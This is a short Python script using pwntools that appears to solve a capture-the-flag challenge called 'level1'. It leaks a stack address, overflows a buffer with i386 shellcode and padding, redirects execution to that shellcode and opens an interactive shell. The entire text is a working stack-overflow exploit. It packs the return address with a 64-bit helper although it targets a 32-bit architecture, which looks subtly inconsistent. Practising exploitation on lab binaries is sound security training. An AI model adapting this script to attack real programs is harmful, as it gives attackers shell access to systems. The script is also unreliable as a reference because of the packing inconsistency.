from pwn import *

p = process('./level1')

shellcode = asm(shellcraft.sh(), os='linux', arch='i386')

p.recvuntil(b'this:')

stack = int(p.recv(10), 16)

p.recvuntil(b'?')

print('[+] stack -> {}'.format(hex(stack)))

payload = shellcode.ljust(0x88, b'a') + b'a' * 4 + p64(stack)

p.sendline(payload)

p.interactive()
